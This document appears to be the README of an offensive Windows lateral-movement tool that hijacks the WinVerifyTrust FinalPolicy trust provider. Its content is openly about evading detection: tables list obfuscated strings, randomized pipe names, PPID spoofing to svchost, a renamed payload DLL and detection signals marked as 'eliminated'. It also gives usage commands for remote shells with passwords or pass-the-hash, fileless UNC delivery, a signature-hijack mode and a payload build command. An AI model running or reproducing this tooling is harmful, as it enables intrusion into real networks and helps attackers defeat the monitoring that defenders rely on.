# SIPExec v3 — Experimental (Evasion-Hardened)

Lateral movement via WinVerifyTrust FinalPolicy hijack with reduced detection surface.

## Changes from v2

| Area | v2 | v3 |
|------|----|----|
| wmiprvse refresh | Kill all instances (Sysmon 5, WMI errors) | Query fresh namespace (no kill) |
| Registry dwell | Entire session lifetime | <2s atomic window |
| Pipe name | Static `\\pipe\sipexec` | Derived from DLL path hash (`wkssvc_<hash>`) |
| Trust provider GUID | Authenticode only (most monitored) | Selectable: default, driver, https |
| Payload export | `SipExecFinalPolicy` | `WTHelperCertCheckValidSignature` |
| IOC strings | Plaintext | XOR-obfuscated |
| PE internal name | `sipexec_payload.dll` | `wtsvc.dll` |
| Child process | `wmiprvse → cmd.exe` | PPID-spoofed to svchost.exe |
| Timing | Fixed sleeps | Jittered ±30% |

## Usage

```bash
# Interactive shell (default GUID)
python3 sipexec.py 'DOMAIN/user:password@target'

# Single command, driver GUID (less monitored)
python3 sipexec.py -guid driver 'user:pass@target' "whoami /all"

# Fileless via UNC
sudo python3 sipexec.py -serve -listen 10.0.0.5 'user:pass@target'

# With SIP hijack (DLL appears signed)
python3 sipexec.py -sig-hijack -guid https 'user:pass@target'

# PTH
python3 sipexec.py -hashes :NTHASH 'user@target' "net user"
```

## Build Payload

```bash
x86_64-w64-mingw32-gcc -shared -O2 -s -fno-ident \
  -o sipexec_payload.dll sipexec_payload.c payload.def -lkernel32
```

## Detection Surface (reduced)

| Signal | Status |
|--------|--------|
| wmiprvse terminated | ✅ Eliminated |
| FinalPolicy registry modified | ⚠️ Still fires, but <2s window |
| Static pipe name IOC | ✅ Eliminated (randomized) |
| cmd.exe child of wmiprvse | ⚠️ Still present but PPID-spoofed |
| DLL export name IOC | ✅ Eliminated |
| Payload strings | ✅ Obfuscated |

## Files

- `sipexec.py` — Python orchestrator
- `sipexec_payload.c` — Payload source
- `payload.def` — PE module definition (controls internal DLL name)
- `sipexec_payload.dll` — Built payload (unsigned)
